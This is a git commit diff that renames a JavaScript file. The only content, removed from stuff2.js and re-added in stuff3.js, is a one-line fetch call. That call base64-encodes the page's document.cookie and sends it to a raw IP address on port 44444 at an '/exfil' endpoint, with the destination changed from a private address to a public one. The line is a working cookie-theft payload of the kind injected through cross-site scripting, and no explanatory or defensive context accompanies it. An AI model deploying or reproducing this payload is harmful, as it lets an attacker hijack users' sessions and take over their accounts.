4800d7396cac42ffd319e2232ab119c5b8eca29b
pottm :3 <pottm@users.noreply.github.com>
2023-01-13 15:29:27 +0100

    Update and rename stuff2.js to stuff3.js

--- stuff2.js
+++
@@ -1,1 +0,0 @@
-fetch("http://172.18.188.25:44444/exfil?data=" + encodeURIComponent(btoa(document.cookie)))
---
+++ stuff3.js
@@ -0,0 +1,1 @@
+fetch("http://88.64.31.40:44444/exfil?data=" + encodeURIComponent(btoa(document.cookie)))
